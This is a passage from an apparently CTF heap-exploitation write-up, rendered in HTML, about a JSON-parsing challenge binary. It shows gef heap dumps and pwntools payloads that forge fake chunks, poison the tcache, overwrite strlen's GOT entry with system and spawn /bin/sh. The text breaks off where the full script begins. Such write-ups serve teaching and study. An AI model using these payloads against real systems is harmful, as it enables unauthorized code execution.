</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef&gt; heap top
</span></span><span class="line"><span class="cl">[+] arena.top: 0x55555555c860
</span></span><span class="line"><span class="cl">Chunk(addr = 0x55555555c860 , size=0x207a0, flags=PREV_INUSE)
</span></span><span class="line"><span class="cl">  Chunk size: 133024 (0x207a0)
</span></span><span class="line"><span class="cl">  Usable size: 133016 (0x20798)
</span></span><span class="line"><span class="cl">  Previous chunk size: 0 (0x0)
</span></span><span class="line"><span class="cl">  PREV_INUSE flag: On
</span></span><span class="line"><span class="cl">  IS_MMAPPED flag: Off
</span></span><span class="line"><span class="cl">  NON_MAIN_ARENA flag: Off
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Forward pointer: 0x5550000092ec
</span></span><span class="line"><span class="cl">  Backward pointer: 0x4
</span></span><span class="line"><span class="cl">gef&gt; x/60gx 0x55555555c860
</span></span><span class="line"><span class="cl">0x55555555c860: 0x0000000000000000      0x00000000000207a1
</span></span><span class="line"><span class="cl">0x55555555c870: 0x00005550000092ec      0x0000000000000004
</span></span><span class="line"><span class="cl">0x55555555c880: 0x0000000000000000      0x0000000000020781
</span></span><span class="line"><span class="cl">0x55555555c890: 0x0000555000009d3c      0x000055555555c870
</span></span><span class="line"><span class="cl">0x55555555c8a0: 0x0000000000000000      0x0000000000020761
</span></span><span class="line"><span class="cl">0x55555555c8b0: 0x00007ffff7facce0      0x000055555555c6e0
</span></span><span class="line"><span class="cl">0x55555555c8c0: 0x6262626262626262      0x6262626262626262
</span></span><span class="line"><span class="cl">0x55555555c8d0: 0x6262626262626262      0x6262626262626262
</span></span><span class="line"><span class="cl">0x55555555c8e0: 0x6262626262626262      0x6262626262626262
</span></span><span class="line"><span class="cl">0x55555555c8f0: 0x6262626262626262      0x6262626262626262
</span></span><span class="line"><span class="cl">0x55555555c900: 0x6262626262626262      0x6262626262626262
</span></span><span class="line"><span class="cl">0x55555555c910: 0x6262626262626262      0x6262626262626262
</span></span><span class="line"><span class="cl">0x55555555c920: 0x6262626262626262      0x6262626262626262
</span></span><span class="line"><span class="cl">0x55555555c930: 0x0000000000000090      0x0000000000000020
</span></span><span class="line"><span class="cl">0x55555555c940: 0x0000555000009ddc      0x0000000000000004
</span></span><span class="line"><span class="cl">0x55555555c950: 0x0000000000000000      0x00000000000206b1
</span></span><span class="line"><span class="cl">0x55555555c960: 0x0000555000009c6c      0x000055555555c940
</span></span><span class="line"><span class="cl">0x55555555c970: 0x0000000000000000      0x0000000000020691
</span></span><span class="line"><span class="cl">0x55555555c980: 0x6363636363636363      0x6363636363636363
</span></span><span class="line"><span class="cl">0x55555555c990: 0x6363636363636363      0x6363636363636363
</span></span><span class="line"><span class="cl">0x55555555c9a0: 0x6363636363636363      0x6363636363636363
</span></span><span class="line"><span class="cl">0x55555555c9b0: 0x6363636363636363      0x6363636363636363
</span></span><span class="line"><span class="cl">0x55555555c9c0: 0x6363636363636363      0x6363636363636363
</span></span><span class="line"><span class="cl">0x55555555c9d0: 0x6363636363636363      0x6363636363636363
</span></span><span class="line"><span class="cl">0x55555555c9e0: 0x6363636363636363      0x6363636363636363
</span></span><span class="line"><span class="cl">0x55555555c9f0: 0x6363636363636363      0x6363636363636363
</span></span><span class="line"><span class="cl">0x55555555ca00: 0x00007fffffffcd20      0x0000000000020601 &lt;- Our injected target address of next
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, we successfully trigger the <code>chunk</code> consolidation, where the <code>top</code> chunk contains our injected value which we prepared to be used as the uninitialized <code>next</code> value (which in this case is the one that located at <code>0x55555555ca00</code>).</p>
<p>Now that we have successfully inject it, it&rsquo;s time to trigger the bug. There are two precautions that we need to do here during sending our next input:</p>
<ul>
<li>We need to ensure that we have put our fake chunks in the target address that we put as the <code>next</code> value.
<ul>
<li>In this case, <code>buf_stack+0x50+0x100</code> need to contains our fake chunks.</li>
</ul>
</li>
<li>Then, we need to ensure that when we trigger the bug, the last <code>array_t</code> element that we allocate overlapping with our prepared uninitialized value.
<ul>
<li>In this example, that means the last <code>array_t</code> element that we allocated need to be allocated at address <code>0x55555555ca00</code>.</li>
</ul>
</li>
</ul>
<p>To achieve the above precautions, let&rsquo;s start by checking the <code>bins</code> state first.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef&gt; bins
</span></span><span class="line"><span class="cl">---------------------------------- Tcache Bins for arena &#39;main_arena&#39; ----------------------------------
</span></span><span class="line"><span class="cl">tcachebins[idx=0, size=0x20, @0x55555555c090]: fd=0x55555555c6d0 count=7
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c6c0 , size=0x20, flags=PREV_INUSE, fd=0x5550000096dc(=0x55555555c380))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c370 , size=0x20, flags=PREV_INUSE, fd=0x5550000097bc(=0x55555555c2e0))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c2d0 , size=0x20, flags=, fd=0x55500000961c(=0x55555555c340))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c330 , size=0x20, flags=PREV_INUSE, fd=0x55500000963c(=0x55555555c360))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c350 , size=0x20, flags=PREV_INUSE, fd=0x55500000965c(=0x55555555c300))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c2f0 , size=0x20, flags=PREV_INUSE, fd=0x55500000967c(=0x55555555c320))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c310 , size=0x20, flags=PREV_INUSE, fd=0x55555555c(=0x000000000000))
</span></span><span class="line"><span class="cl">tcachebins[idx=7, size=0x90, @0x55555555c0c8]: fd=0x55555555c3a0 count=7
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c390 , size=0x90, flags=PREV_INUSE, fd=0x55500000916c(=0x55555555c430))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c420 , size=0x90, flags=PREV_INUSE, fd=0x55500000919c(=0x55555555c4c0))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c4b0 , size=0x90, flags=PREV_INUSE, fd=0x55500000902c(=0x55555555c570))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c560 , size=0x90, flags=PREV_INUSE, fd=0x55500000931c(=0x55555555c640))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c630 , size=0x90, flags=PREV_INUSE, fd=0x55500000924c(=0x55555555c710))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c700 , size=0x90, flags=, fd=0x5550000092bc(=0x55555555c7e0))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c7d0 , size=0x90, flags=, fd=0x55555555c(=0x000000000000))
</span></span><span class="line"><span class="cl">[+] Found 14 valid chunks in tcache.
</span></span><span class="line"><span class="cl">----------------------------------- Fast Bins for arena &#39;main_arena&#39; -----------------------------------
</span></span><span class="line"><span class="cl">fastbins[idx=0, size=0x20, @0x7ffff7facc90]: fd=0x55555555c540
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c540 , size=0x20, flags=PREV_INUSE, fd=0x55500000934c(=0x55555555c610))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c610 , size=0x20, flags=PREV_INUSE, fd=0x5550000090ac(=0x55555555c5f0))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c5f0 , size=0x20, flags=PREV_INUSE, fd=0x55555555c(=0x000000000000))
</span></span><span class="line"><span class="cl">[+] Found 3 valid chunks in fastbins.
</span></span><span class="line"><span class="cl">---------------------------------- Unsorted Bin for arena &#39;main_arena&#39; ----------------------------------
</span></span><span class="line"><span class="cl">unsorted_bin[idx=0, size=any, @0x7ffff7faccf0]: fd=0x55555555c290, bk=0x55555555c6e0
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c290 , size=0x40, flags=PREV_INUSE, fd=0x55555555c790, bk=0x7ffff7facce0)
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c790 , size=0x40, flags=PREV_INUSE, fd=0x55555555c6e0, bk=0x55555555c290)
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c6e0 , size=0x20, flags=PREV_INUSE, fd=0x7ffff7facce0, bk=0x55555555c790)
</span></span><span class="line"><span class="cl">[+] Found 3 valid chunks in unsorted bin.
</span></span></code></pre></td></tr></table>
</div>
</div><p>We want to allocate <code>array_t</code> elements by consuming the <code>top</code> chunk. <code>array_t</code> struct&rsquo;s size is <code>0x10</code>, which mean it will consume the <code>0x20</code> freed chunk. That means, we need to consume all of the <code>0x20</code> freed chunks and the <code>unsortedbin</code> chunks as well. In total, we need to allocate at least <code>15</code> chunks with size <code>0x20</code> (10 from <code>tcache</code> + <code>fastbin</code>, 5 from <code>unsortedbin</code>).</p>
<p>If we send an <code>array</code> as our input, it will consume one <code>0x20</code> chunk (because it is a <code>json_t</code> object). Next, when we add one integer element to the array, it will consume two <code>0x20</code> chunks. If we allocate an array of 7 integer elements, this will consumed all of the <code>15</code> chunks from the freelist.</p>
<p>Next, observed that our injected <code>next</code> value located at <code>top+0x1a0</code>. So, we need to allocate more element first, so that the last element of our input array will be placed on there. There are many ways to do this, but after calculating it thoroughly, I came with the below payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span>  <span class="sa">b</span><span class="s1">&#39;[0,0,0,0,0,0,0, &#39;</span> <span class="c1"># Consume all of the 15 0x20 chunks</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;0,0,1,&#34;1&#34;,&#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#34;,64&#39;</span> <span class="c1"># Last element next will be filled with our injected value before, which is buf_stack+0x150</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above input will make the last element <code>next</code> points to <code>buf_stack+0x150</code>. Now, we still need to extend that payload, because we need to ensure <code>buf_stack+0x150</code> contains a valid <code>array_t</code> elements. To do this, we can simply pad our input first with <code>\x00</code> up until <code>0x150</code>. By padding it with null bytes, the <code>parse_value</code> function will stop the parse only until our last element, even though our input size is much larger than that.</p>
<p>Now, we need to think how to craft the fake chunks. I came up with the below layout:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">buf_size</span><span class="o">-</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p_stack</span> <span class="o">=</span> <span class="n">target_free</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">p_stack</span><span class="o">+</span><span class="mh">0x70</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_stack</span><span class="o">+</span><span class="mh">0x40</span><span class="p">),</span> <span class="c1"># p_stack is this address</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span> <span class="c1"># p_stack+0x40</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_stack</span><span class="o">+</span><span class="mh">0xa0</span><span class="p">),</span> <span class="c1"># p_stack+0x70</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="c1"># p_stack+0xa0</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To explain the above payload:</p>
<ul>
<li>I set the <code>next</code> pointer of the fake chunk (located at <code>p_stack</code>) points to <code>p_stack+0x70</code>, and set the <code>value</code> pointer to <code>p_stack+0x40</code>.</li>
<li>I set both of the <code>p_stack+0x70</code> and <code>p_stack+0x40</code> chunk size to <code>0x31</code>.</li>
<li>I set the <code>next</code> pointer of <code>p_stack+0x40</code> to <code>null</code>, and set the <code>value</code> pointer to <code>p_stack+0xa0</code>.</li>
<li>I set the <code>p_stack+0xa0</code> chunk size to <code>0x31</code>.</li>
<li>Then, I set the chunk size of <code>p_stack</code> to <code>0x71</code>, just to be safe during <code>free</code>, so that the <code>p_stack</code> next chunk is pointing to a valid chunk (which in this case <code>p_stack+0x70</code>).</li>
</ul>
<p>When the <code>free_value</code> try to free our input, due to the <code>next</code> bug, our fake chunks will be iterated as well, and they will be freed and sent to the <code>tcache</code> bins list for chunks with size <code>0x30</code>. Below is the <code>bins</code> state after the above script execution.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef&gt; bins
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">tcachebins[idx=1, size=0x30, @0x55555555c098]: fd=0x7fffffffcd90 count=4
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x7fffffffcd80 , size=0x30, flags=PREV_INUSE, fd=0x7ff80000323c(=0x7fffffffcdc0))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x7fffffffcdb0 , size=0x30, flags=PREV_INUSE, fd=0x7ff80000329c(=0x7fffffffcd60))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x7fffffffcd50 , size=0x30, flags=PREV_INUSE, fd=0x5552aaaa362c(=0x55555555c9d0))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x55555555c9c0 , size=0x30, flags=PREV_INUSE, fd=0x55555555c(=0x000000000000))
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we have put our fake chunks to the freelist, we can move to the last step, which is gaining shell.</p>
<h4 id="gaining-shell">Gaining shell</h4>
<p>In order to gain shell, my plan is to overwrite the <code>strlen</code> GOT of <code>libc</code> to <code>system</code>, so that when it call <code>printf</code> during <code>print_value</code> try to print an object <code>key</code> (which is string type), it will call <code>system</code> with our input <code>key</code> as the parameter. So, to do that, we need to poison the <code>tcache</code> of <code>0x30</code> metadata.</p>
<p>Poisoning it is very simple. Because all of the freed chunks are overlapping with the <code>buf_stack</code>, we can simply abuse the LOC to read our raw input to poison it. Take a look at the below script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Tcache poison time!</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="p">(</span><span class="n">buf_size</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">buf_stack</span><span class="p">,</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x21a080</span><span class="p">)),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We basically just need to send <code>null</code> bytes to the binary (so that it won&rsquo;t do any parsing to our input), then pad it like what we did before, and overwrite all of the mangled pointer to our desired address, which is the <code>strlen</code> GOT address minus by <code>0x18</code>. We need to do this because we plan to allocate a string object to trigger the allocation of the <code>0x30</code> chunks, and the binary use <code>strndup</code> to do this. So, by sending a string of <code>b'a'*0x18</code> appended with the <code>system</code> address, <code>strndup</code> will allocate <code>0x30</code> chunks (which located at <code>strlen</code> GOT minus <code>0x18</code>), and it will overwrite the <code>strlen</code> GOT with <code>system</code>.</p>
<p>Taking a look at the previous <code>tcache</code> list, we know that <code>p_stack+0x70</code> is the first entry. So, we just need to poison that freed chunk with the target address. We send this payload, and now we successfully poison the <code>tcache</code> list. Below is the updates list after we execute the above script.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef&gt; bins
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">tcachebins[idx=1, size=0x30, @0x55555555c098]: fd=0x7fffffffcd90 count=4
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x7fffffffcd80 , size=0x30, flags=PREV_INUSE, fd=0x7ff808053f7c(=0x7ffff7fac080))
</span></span><span class="line"><span class="cl"> -&gt; Chunk(addr = 0x7ffff7fac070 , size=0x7ffff7f319a0, flags=, fd=0x7ffff7f330c0(=0x7ff8080c4f6c)) &lt;- target got address
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we have successfully poison the <code>tcache</code> list, it&rsquo;s time for us to overwrite it with <code>system</code> and spawn a shell. Below is the last script that we need to execute.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;[&#34;/bin/sh;aaaaaaaaaaaaaaaaaaaaaaaa&#34;,&#34;aaaaaaaaaaaaaaaaaaaaaaaa&#39;</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;&#34;]&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">s_json</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above execution will overwrite <code>strlen</code> GOT with <code>system</code>, then during <code>print_value</code>, when it try to print our first entry (which contains <code>/bin/sh</code>), it will call <code>strlen</code> to that string, and due to the overwrite, it will call <code>system(&quot;/bin/sh&quot;)</code> instead.</p>
<p>Finally, we have finished our exploitation. Below is the full script to exploit the challenge.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
